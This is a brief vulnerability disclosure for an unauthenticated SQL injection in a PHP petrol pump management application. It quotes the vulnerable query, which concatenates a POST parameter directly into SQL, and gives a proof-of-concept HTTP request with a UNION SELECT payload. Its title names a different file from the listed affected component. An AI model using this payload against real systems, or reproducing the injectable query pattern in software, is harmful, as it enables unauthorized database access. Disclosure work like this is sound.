# SOURCECODESTER / Petrol pump management software - profile_crud.php Unauthenticated SQL Injection

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://www.sourcecodester.com/php/17180/petrol-pump-management-software-free-download.html

## Affected Component
> /admin/edit_categories.php

## Code
```php
 <?php
                                    $stmt = $conn->prepare("SELECT * FROM `fuel_category` WHERE id='" . $_POST['id'] . "' AND delete_status='0' ");

                                    $stmt->execute();
                                    $record = $stmt->fetchAll();
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /admin/edit_categories.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

id=1'+union+select+null,version(),null+%23g
```

## Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/160950031/3ed26dd8-f6d4-4029-8447-be5e7d81eb92)
